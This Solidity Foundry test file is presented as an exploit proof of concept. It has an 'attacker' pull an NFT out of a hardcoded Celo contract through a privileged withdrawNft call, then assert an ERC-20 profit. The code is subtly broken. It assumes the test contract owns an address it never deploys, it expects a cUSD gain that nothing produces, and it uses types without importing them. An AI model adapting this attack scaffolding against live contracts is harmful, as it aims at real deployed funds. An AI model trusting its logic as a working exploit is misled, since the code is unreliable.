interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function totalSupply() external view returns (uint256);
}

interface ICUSD {
    function withdrawNft(address token_, address destination_, uint256 tokenId_) external;
}

interface IMockNFT is IERC721 {
    function mint(address to, uint256 tokenId) external;
}

contract MockNFT is IMockNFT {
    mapping(uint256 => address) public override ownerOf;
    mapping(address => uint256) public override balanceOf;
    mapping(uint256 => address) private _tokenApprovals;
    mapping(address => mapping(address => bool)) private _operatorApprovals;

    function mint(address to, uint256 tokenId) external override {
        require(ownerOf[tokenId] == address(0), "already minted");
        ownerOf[tokenId] = to;
        balanceOf[to]++;
    }

    function _transfer(address from, address to, uint256 tokenId) private {
        require(ownerOf[tokenId] == from, "not owner");
        ownerOf[tokenId] = to;
        balanceOf[from]--;
        balanceOf[to]++;
    }

    function transferFrom(address from, address to, uint256 tokenId) external payable override {
        require(msg.sender == from || msg.sender == _tokenApprovals[tokenId] || isApprovedForAll(from, msg.sender), "not authorized");
        _transfer(from, to, tokenId);
    }

    function approve(address to, uint256 tokenId) external payable override {
        _tokenApprovals[tokenId] = to;
    }

    function getApproved(uint256 tokenId) public view override returns (address) {
        return _tokenApprovals[tokenId];
    }

    function setApprovalForAll(address operator, bool approved) external override {
        _operatorApprovals[msg.sender][operator] = approved;
    }

    function isApprovedForAll(address owner, address operator) public view override returns (bool) {
        return _operatorApprovals[owner][operator];
    }

    function safeTransferFrom(address from, address to, uint256 tokenId) external payable override {
        safeTransferFrom(from, to, tokenId, bytes(""));
    }

    function safeTransferFrom(address from, address to, uint256 tokenId, bytes calldata data) public payable override {
         require(msg.sender == from || msg.sender == _tokenApprovals[tokenId] || isApprovedForAll(from, msg.sender), "not authorized");
        _transfer(from, to, tokenId);
    }

    function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
        return interfaceId == type(IERC721).interfaceId;
    }
}


contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xC285B7E09A4584D027E5BC36571785B515898246;
    // Celo Dollar (cUSD) address on Celo Mainnet
    address constant CUSD = 0x765de816845861e75a25fca122bb6898b8b1282a;
    address attacker = address(this);
    MockNFT internal mockNft;
    address constant nftOwner = address(0xDEADBEEF);
    uint256 constant tokenId = 1;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        mockNft = new MockNFT();
        // Mint an NFT to a third-party address to simulate it being sent to the contract
        mockNft.mint(nftOwner, tokenId);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = IERC20(CUSD).balanceOf(address(this));
        // Attacker starts with 0 NFTs of this collection
        assertEq(mockNft.balanceOf(attacker), 0, "Attacker should start with 0 NFTs");

        // A third party (nftOwner) sends their NFT to the target contract
        vm.startPrank(nftOwner);
        mockNft.transferFrom(nftOwner, TARGET, tokenId);
        vm.stopPrank();

        // Verify the NFT is now held by the target contract
        assertEq(mockNft.ownerOf(tokenId), TARGET, "Target contract should own the NFT");

        // The attacker, being the contract owner, calls the privileged function to withdraw the NFT.
        // The test contract is the deployer and thus the owner of the TARGET contract.
        ICUSD(TARGET).withdrawNft(address(mockNft), attacker, tokenId);

        // Verify the attacker now possesses the NFT
        assertEq(mockNft.balanceOf(attacker), 1, "Attacker should have 1 NFT after exploit");
        assertEq(mockNft.ownerOf(tokenId), attacker, "Attacker should be the new owner of the NFT");
        uint256 finalBalance = IERC20(CUSD).balanceOf(address(this));
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No ERC20 profit");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

